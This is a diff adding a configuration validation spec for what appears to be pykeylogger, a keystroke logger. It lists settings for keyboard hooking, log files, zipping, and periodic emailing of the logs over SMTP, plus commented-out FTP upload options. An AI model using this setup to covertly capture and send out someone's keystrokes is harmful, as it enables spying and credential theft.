@@ -1,0 +1,170 @@
+# This is a config validation file. Do not change anything in here.
+
+[General]
+
+# default: "" (Blank password)
+Master Password Tooltip = string()
+Master Password = string(default="")
+
+# default: C:\Temp\logdir
+Log Directory Tooltip = string()
+Log Directory = string(max=64, default="C:\Temp\logdir")
+
+# default: True
+Hook Keyboard Tooltip = string()
+Hook Keyboard = boolean(default=True)
+
+# default: False
+Parse Backspace Tooltip = string()
+Parse Backspace = boolean(default=False)
+
+# default: False
+Parse Escape Tooltip = string()
+Parse Escape = boolean(default=False)
+
+# default: F12
+Control Key Tooltip = string()
+Control Key = string(default="Lcontrol;Rcontrol;F12")
+
+# default: None
+Applications Not Logged Tooltip = string()
+Applications Not Logged = string(default=None)
+
+# default: None
+Log File Tooltip = string()
+Log File = string(default="logfile.txt")
+
+# default: |
+Log File Field Separator Tooltip = string()
+Log File Field Separator = string(default="|")
+
+# default: None
+System Log Tooltip = string()
+System Log = string(default=None)
+
+Usage Time Flag NoDisplay Tooltip = string()
+Usage Time Flag NoDisplay = string()
+
+[E-mail]
+
+# default: False
+SMTP Send Email Tooltip = string()
+SMTP Send Email = boolean(default=False)
+
+# default: True
+SMTP Needs Login Tooltip = string()
+SMTP Needs Login = boolean(default=True)
+
+# default: yourusername
+SMTP Username Tooltip = string()
+SMTP Username = string(default="yourusername")
+
+# default: "" (Blank password)
+SMTP Password Tooltip = string()
+SMTP Password = string(default="")
+
+# default: smtp.gmail.com
+SMTP Server Tooltip = string()
+SMTP Server = string(default="smtp.gmail.com")
+
+# default: 587
+SMTP Port Tooltip = string()
+SMTP Port = integer(min=1, max=65534, default=587)
+
+# default: True
+SMTP Use TLS Tooltip = string()
+SMTP Use TLS = boolean(default=True)
+
+# default: yourfromaddress@host.com
+SMTP From Tooltip = string()
+SMTP From = string(default="yourfromaddress@host.com")
+
+# default: yourtoaddress@host.com
+SMTP To Tooltip = string()
+SMTP To = string(default="yourtoaddress@host.com")
+
+# default: Automatic Logfile Email
+SMTP Subject Tooltip = string()
+SMTP Subject = string(default="Automatic Logfile Email")
+
+# default: "Please see attached zipfile."
+SMTP Message Body Tooltip = string()
+SMTP Message Body = string(default="Please see attached zipfile.")
+
+# default: 4.0
+Email Interval Tooltip = string()
+Email Interval = float(min=0.016, default=4.0)
+
+[Zip]
+
+##### disabled. filename set to log_[date].zip
+# Specify the filename for the zip archive that will be emailed to you
+# default: logzip.zip
+#zipArchiveNameTooltip=Specify the filename for the zip archive that will be emailed to you. "[date]" will be replaced with current date/time in MMDDYYYY_HHMMSS format. If "[date]" is not present, it will be added at the end of the filename, as it is needed for proper operation.
+#zipArchiveName=log_[date].zip
+
+# default: False
+Zip Enable Tooltip = string()
+Zip Enable = boolean(default=False)
+
+# default: 4.0
+Zip Interval Tooltip = string(default="Set this to the time interval between automatic zip events, in HOURS.")
+Zip Interval = float(min=0.016, default=4.0)
+
+#~ [FTP]
+
+#~ # default: False
+#~ FTP Enable Tooltip = string(default="Set to True to enable automatic periodic uploading of a zipped archive of logfiles by FTP.")
+#~ FTP Enable = boolean(default=False)
+
+#~ # default: your.FTP.server
+#~ FTP Server Tooltip = string(default="Set to the hostname of your FTP server.")
+#~ FTP Server = string(default="your.FTP.server")
+
+#~ # default: 21
+#~ FTP Port Tooltip = string(default="Set to the port number of your FTP server (most FTP servers run on port 21).")
+#~ FTP Port = integer(min=1, max=65534, default=21)
+
+#~ # default: pykeylogger
+#~ FTP Upload Directory Tooltip = string(default="Set to the directory on the server where you would like to upload (relative or full path accepted).")
+#~ FTP Upload Directory = string(default="pykeylogger")
+
+#~ # default: anonymous
+#~ FTP Username Tooltip = string(default="Set to your username on the target FTP server.")
+#~ FTP Username = string(default="anonymous")
+
+#~ # For security purposes, this value can only be set through the control panel, to avoid storing your password in plain text.
+#~ # Setting it here directly will not work.
+#~ # default: anonymous@
+#~ FTP Password Tooltip = string(default="Set to your password on the target FTP server.")
+#~ FTP Password = string(default="anonymous@")
+
+#~ # default: True
+#~ FTP Passive Tooltip = string(default="Set to True to enable passive mode file transfer (recommended).")
+#~ FTP Passive = boolean(default=True)
+
+#~ # default: 4.0
+#~ FTP Interval Tooltip = string(default="Set this to the time interval between automatic FTP events, in HOURS.")
+#~ FTP Interval = float(min=0.016, default=4.0)
+
+[Log Maintenance]
+
+# default: False
+Delete Old Logs Tooltip = string(default="Set to True to enable automatic deletion of old logs.")
+Delete Old Logs = boolean(default=False)
+
+# default: 2.0
+Max Log Age Tooltip = string(default="Set to the maximum age of the logs that you want to keep, in days. Logs older than this will be deleted.")
+Max Log Age = float(min=0.00069, default=2.0)
+
+# default: 2.0
+Age Check Interval Tooltip = string(default="Set to the frequency of checking for and deleting logs older than maxLogAge, in HOURS.")
+Age Check Interval = float(min=0.016, default=2.0)
+
+# default: 120
+Flush Interval Tooltip = string()
+Flush Interval = float(min=10, default=120.0)
+
+# default: 4.0
+Log Rotation Interval Tooltip = string()
+Log Rotation Interval = float(min=0.016, default=4.0)
